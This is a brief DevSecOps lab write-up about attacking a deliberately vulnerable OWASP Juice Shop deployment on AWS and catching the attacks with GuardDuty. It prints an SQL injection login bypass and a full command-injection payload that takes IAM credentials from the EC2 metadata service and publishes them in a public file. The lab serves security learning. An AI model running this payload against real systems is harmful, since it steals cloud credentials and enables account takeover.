Project Overview This project demonstrates a DevSecOps approach to cloud security. It deploys a purpose-built vulnerable web architecture (OWASP Juice Shop) using AWS CloudFormation to simulate real-world attack vectors.


Threat Detection with GuardDuty
Project Link: View Project
Author: Muhammad Ali ahmed

Email: m.aliahmed0101@gmail.com


Introducing Today's Project!
Tools and concepts
Project reflection

Project Setup
We are deploying EC2 instance for app hosting , S3 for sensitive data and network resources like VPC and CDN
Try to hack it
AWS Guard Duty is a service that detects unusual activities in your AWS infrastructure and reports it


SQL Injection
The first attack I performed on the web app is SQL injection, which means we are trying to manipulate the SQL query used for login. SQL injection is a security risk because it can bypass Database Access.
My SQL injection attack involved ' or 1=1;--. This means that query will always evaluate to true, which lets you avoid the authentication check.


Command Injection
Next, I used command injection, which is #{global.process.mainModule.require('child_process').exec('CREDURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/;TOKEN=curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" && CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL | echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN") && echo $CRED | json_pp >frontend/dist/frontend/assets/public/credentials.json')}

The Juice Shop web app is vulnerable to this because it is not using Sanitization while accepting data

Attack Verification

Using CloudShell for Advanced Attacks

GuardDuty's Findings

Extra: Malware Protection


